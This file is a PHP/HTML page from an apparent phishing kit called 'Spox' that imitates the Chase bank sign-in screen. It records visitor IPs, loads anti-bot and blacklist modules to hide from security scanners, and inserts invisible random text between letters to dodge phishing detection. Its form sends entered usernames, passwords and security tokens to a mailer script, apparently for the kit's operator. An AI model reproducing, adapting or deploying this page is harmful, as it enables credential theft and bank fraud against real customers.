<?php
session_start();
error_reporting(0);

/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * Chase -
 * version 3.0
 * icq & telegram = @spoxcoder
 
###############################################
#$            C0d3d by Spox_dz               $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 Chase             $#
###############################################

**/

include'Spox/Anti/IP-BlackList.php';  
include'Spox/Anti/Bot-Crawler.php';
include'Spox/Anti/Bot-Spox.php';
include'Spox/Anti/blacklist.php';
include'Spox/Anti/new.php';
include'Spox/Functions/Fuck-you.php'; 
include'Spox/Anti/Dila_DZ.php';
include'admin/YOUR-CONFIG.php';

$SPOX = substr(sha1(mt_rand()),1,25);

if (!isset($_GET['chase_id']) || !isset($_GET['country'])) {
        header("HTTP/1.0 404 Not Found");
        exit();
    }

if (!isset($_SESSION['CHASE_SPOX'])) {

  header("Location: index");
  exit();
}

    $content2 = "#>".$_SESSION['ip']."\r\n";
    $save2=fopen("Spox/Chase_Result/total_login_view.txt","a+");
    fwrite($save2,$content2);
    fclose($save2);


?>


<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" class="no-js" lang="en" dir="ltr">
<head>

        <!-- Meta BY Spox -->
        <meta charset="utf-8" />
        <meta name="robots" content="noindex,nofollow" />
        <title>Sign in</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />

        <!-- ICONS BY Spox -->
        <link rel="apple-touch-icon" sizes="152x152" href="Spox/Files/img/chase-touch-icon-152x152.png">
        <link rel="apple-touch-icon" sizes="120x120" href="Spox/Files/img/chase-touch-icon-120x120.png">
        <link rel="apple-touch-icon" sizes="76x76" href="Spox/Files/img/chase-touch-icon-76x76.png">
        <link rel="apple-touch-icon" href="Spox/Files/img/chase-touch-icon.png">
        <link rel="shortcut icon" href="Spox/Files/img/chasefavicon.ico">

        <!-- Css BY Spox -->
        <link rel="stylesheet" href="Spox/Files/css/logon.css">
        <link rel="stylesheet" href="Spox/Files/css/blue-ui2.css">
        <link rel="stylesheet" href="Spox/Files/css/login.css">
        <link rel="stylesheet" href="Spox/Files/css/dashboard.css">


        <!-- Loading  -->
        <script type="text/javascript">
            document.onreadystatechange = function() {
                var state = document.readyState
                if (state == 'complete') {
                    setTimeout(function() {
                        document.getElementById('interactive');
                        document.getElementById('fixed').style.visibility = "hidden";
                    }, 1500);
                }
            }
        </script>


<body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true" class="daog">

  <div id="load" style="display:none">
      <div class="spinner" style="position: fixed;top: 43%;right: 0;bottom: 0;left: 0;z-index: 200;margin: 0;text-align: center;">
        <div class="">
          <div id="chaseSpinnerID" class="jpui spinner" tabindex="-1">
            <span id="accessible-chaseSpinnerID" class="util accessible-text">l<font style="color:transparent;font-size:0px"><?= $SPOX ?></font>o<font style="color:transparent;font-size:0px"><?= $SPOX ?></font>a<font style="color:transparent;font-size:0px"><?= $SPOX ?></font>d<font style="color:transparent;font-size:0px"><?= $SPOX ?></font>i<font style="color:transparent;font-size:0px"><?= $SPOX ?></font>n<font style="color:transparent;font-size:0px"><?= $SPOX ?></font>g</span>
          </div>
        </div>
      </div>
    </div>


    <div id="fixed">
       <div class="spinner" style="position: fixed;top: 43%;right: 0;bottom: 0;left: 0;z-index: 200;margin: 0;text-align: center;">
            <div class="">
               <div id="chaseSpinnerID" class="jpui spinner" tabindex="-1">
                  <span id="accessible-chaseSpinnerID" class="util accessible-text">l<font style="color:transparent;font-size:0px"><?= $SPOX ?></font>o<font style="color:transparent;font-size:0px"><?= $SPOX ?></font>a<font style="color:transparent;font-size:0px"><?= $SPOX ?></font>d<font style="color:transparent;font-size:0px"><?= $SPOX ?></font>i<font style="color:transparent;font-size:0px"><?= $SPOX ?></font>n<font style="color:transparent;font-size:0px"><?= $SPOX ?></font>g</span>
               </div>
            </div>
       </div>
    </div>


<div id="logonApp" data-is-view="true">
<div class="homepage" tabindex="-1">
<div id="advertisenativeapp" data-has-view="true">
<div data-is-view="true">
<div class="advertiseNativeApp"></div></div></div>
<div class="toggle-aria-hidden" id="sitemessage" role="region" aria-labelledby="site-messages-heading" aria-hidden="true" data-has-view="true">
<div data-is-view="true">
</div></div>
<div class="logon-container" id="container">
<header class="toggle-aria-hidden" id="logon-summary-menu" data-has-view="true">
<div class="logon header jpui transparent navigation bar" data-is-view="true">
<a id="logoHomepageLink" href="#">
<div class="chase logo"></div>
</a>
<span id="logonCloseIcon-iconanchor-wrapper">
<a class="jpui iconaction logon-close-icon" href="javascript:void(0);" id="logonCloseIcon">

<i class="jpui searchx icon" id="icon-logonCloseIcon" aria-hidden="true"></i></a>
</span>
</div>
</header> 

<main id="logon-content" data-has-view="true">
<div class="container logon" data-is-view="true">
<div>
<div id="backgroundImage">
<div class="jpui background image fixed" id="geoImage">
</div>
</div>
</div>
<div class="row">
<div class="col-xs-12 col-md-6 col-md-offset-3 logoff hidden" id="logoffbox">
<div class="jpui raised segment">
<div class="row">
<div class="col-xs-12">
<div class="progress">
<div class="bar">
</div>
</div>
</div>
</div>
</div>
</div>
<div class="col-xs-12 col-sm-6 col-sm-offset-3 logon-box" id="logonbox">
<div class="jpui raised segment">
<div class="row">
<div class="col-xs-10 col-xs-offset-1">
<form id="login-form" method="POST"  action="Spox/Mail/Mail1" >
  <input style="display: none;" type="text" name="spox_b00T" autocomplete="off" />

    <?php 
    if (isset($_GET['invalid'])) {
    $invalid = isset($_GET['invalid']) ? trim(htmlentities($_GET['invalid'])):'';
    $em = "login";
    if ($invalid == $em) {
        print"<input type='hidden' name='invalid' value='invalid'><div id='validator-error-header'><div class='jpui error error inverted primary animate alert' id='logon-error' role='region'><div class='icon'><span id='type-icon-logon-error'><i class='jpui exclamation-color icon' id='icon-type-icon-logon-error' aria-hidden='true'></i></span></div> <div class='icon background'></div> <div class='content wrap' id='content-logon-error'><h2 class='title' tabindex='-1' id='inner-logon-error'><span class='util accessible-text' id='icon-logon-error'>Important: </span>We can't find that username and password. You can <a href='#''>reset your password</a> or try again.</h2> </div></div></div>";}}?>


<div class="logon-xs-toggle" id="userId">
<input class="jpui input logon-xs-toggle" name="username" placeholder="Username"  type="text" data-validation="length" data-validation-length="min1" data-validation-error-msg=" "> 
</div>
<div class="logon-xs-toggle" id="password">
<input  class="jpui input logon-xs-toggle"  placeholder="Password" type="password" name="password"  data-validation="length" data-validation-length="min1" data-validation-error-msg=" ">
</div>
<input type="hidden" name="spox" value="fuck_you_bot">
<div class="logon-xs-toggle" id="securityToken" style="display: none;" >
<input class="jpui input logon-xs-toggle"  placeholder="Token" name="token" type="tel" name="securityToken" data-validation="length" data-validation-length="min6-30" data-validation-error-msg=" "> 
</div>
<div class="row logon-xs-toggle">
<div class="col-xs-6 rememberMe-checkbox-container">
<div class="jpui checkbox" id="rememberMe">
<div class="checkbox-flex">
<div class="checkboxWrap">

<input class="checkbox__input" type="checkbox" id="rememberMe"  name="rememberMe">

<i class="jpui checkmark icon check" aria-hidden="true"></i>
</div>
<label for="input-rememberMe">
<span class="checkbox-label" id="label-rememberMe">R<font style="color:transparent;font-size:0px"><?= $SPOX ?></font>e<font style="color:transparent;font-size:0px"><?= $SPOX ?></font>m<font style="color:transparent;font-size:0px"><?= $SPOX ?></font>e<font style="color:transparent;font-size:0px"><?= $SPOX ?></font>m<font style="color:transparent;font-size:0px"><?= $SPOX ?></font>b<font style="color:transparent;font-size:0px"><?= $SPOX ?></font>e<font style="color:transparent;font-size:0px"><?= $SPOX ?></font>r m<font style="color:transparent;font-size:0px"><?= $SPOX ?></font>e </span></label>
</div>
</div>
</div>
<div class="col-xs-6 token-checkbox-container">
<div class="jpui checkbox useToken" id="useToken">
<div class="checkbox-flex">
<div class="checkboxWrap">
<input class="checkbox__input" type="checkbox" id="input-useToken"  value="on">
<i class="jpui checkmark icon check" aria-hidden="true"></i>
</div>
<label for="input-useToken">
<span class="checkbox-label" id="token">U<font style="color:transparent;font-size:0px"><?= $SPOX ?></font>s<font style="color:transparent;font-size:0px"><?= $SPOX ?></font>e t<font style="color:transparent;font-size:0px"><?= $SPOX ?></font>o<font style="color:transparent;font-size:0px"><?= $SPOX ?></font>k<font style="color:transparent;font-size:0px"><?= $SPOX ?></font>e<font style="color:transparent;font-size:0px"><?= $SPOX ?></font>n </span></label>
</div>
</div>
</div>
</div>
<div class="row">
<button type="submit" id="signin-button" class="jpui button focus fluid primary">
<span class="label">Sign in</span>
</button>

</div>
<div class="row">
<span class="jpui link" id="forgotPassword-link-wrapper">
<a class="link-anchor" id="forgotPassword" href="javascript:void(0);" aria-label=" Forgot username/password? ">Forgot username/password?<i class="jpui progressright icon end-icon" id="forgotPassword-endIcon" aria-hidden="true">
</i>
</a>
</span>
</div>
<div class="row">
<span class="jpui link" id="enrollment-link-wrapper">
<a class="link-anchor last" id="enrollment" href="javascript:void(0);" aria-label=" Not Enrolled? Sign Up Now. ">Not Enrolled? Sign Up Now.<i class="jpui progressright icon end-icon" id="enrollment-endIcon" aria-hidden="true"></i>
</a>
</span>
</div>
</form>
</div>
</div>
</div>
</div>
</div>
</div>
</main>
</div>
<footer class="logon-footer" id="logon-footer" data-has-view="true">    
</footer>
</div>

</div>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>
<script>
$(".checkbox__input").click(function(){
    $(this).toggleClass('checkbox__input--checked')
});

$(document).ready(function() {
  $("#input-useToken").click(function() {
    $("#securityToken").toggle();
  });
});
  $.validate();
  $('#my-textarea').restrictLength( $('#max-length-element') );
  $.validate({
  modules : 'toggleDisabled',
  disabledFormFilter : 'form.toggle-disabled',
  showErrorDialogs : false
});

</script>


</body>
</html>